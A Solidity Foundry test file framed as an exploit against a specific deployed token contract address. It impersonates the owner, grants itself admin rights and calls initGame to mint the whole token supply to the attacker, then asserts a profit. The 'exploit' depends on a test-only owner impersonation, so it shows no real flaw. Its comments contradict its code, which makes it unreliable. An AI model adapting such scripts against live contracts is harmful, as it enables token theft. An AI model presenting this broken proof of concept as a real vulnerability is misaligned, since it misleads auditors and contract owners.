// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface HubGameToken {
    function owner() external view returns (address);
    function adminAdd(address[] memory _addresses) external;
    function initGame(string memory _gameCode, uint256 _supplyToken, uint256 _listingDate, address[] memory _wallets, uint256[] memory _percents, address[] memory _signers, uint256[] memory _tgePercents, uint256[] memory _numOfPeriods, uint256[] memory _ciffs) external returns (address);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        address owner = HubGameToken(TARGET).owner();

        // Store initial attacker balance for comparison
        initialBalance = HubGameToken(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5).balanceOf(address(this));
        // Step 1: Impersonate the owner
        address owner = HubGameToken(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Add attacker as admin
        address[] memory adminList = new address[](1);
        adminList[0] = attacker;
        HubGameToken(TARGET).adminAdd(adminList);

        // Step 3: Prepare parameters for initGame()
        string memory gameCode = "EXPLOIT";
        uint256 supplyToken = 10000000; // 10 million tokens
        uint256 listingDate = block.timestamp + 1 days;

        // Wallets to receive tokens (including attacker)
        address[] memory wallets = new address[](1);
        wallets[0] = attacker;

        // Percent allocation (100% to attacker)
        uint256[] memory percents = new uint256[](1);
        percents[0] = 100;

        // Signers (empty array since we don't need them for the exploit)
        address[] memory signers = new address[](0);

        // TGE percentages (0% since we want immediate access)
        uint256[] memory tgePercents = new uint256[](1);
        tgePercents[0] = 100; // 100% TGE for immediate access

        // Number of periods (1 period for simplicity)
        uint256[] memory numOfPeriods = new uint256[](1);
        numOfPeriods[0] = 1;

        // Cliff periods (0 cliff for immediate release)
        uint256[] memory ciffs = new uint256[](1);
        ciffs[0] = 0;

        // Step 4: Call initGame() to mint tokens to attacker
        HubGameToken(TARGET).initGame(
            gameCode,
            supplyToken,
            listingDate,
            wallets,
            percents,
            signers,
            tgePercents,
            numOfPeriods,
            ciffs
        );

        vm.stopPrank();

        // Step 5: Verify balance increased
        uint256 finalBalanceHub = HubGameToken(TARGET).balanceOf(attacker);
        assertGt(finalBalanceHub, initialBalance, "Attacker balance should have increased");
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalanceHub);
        uint256 finalBalanceERC20 = IERC20(0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

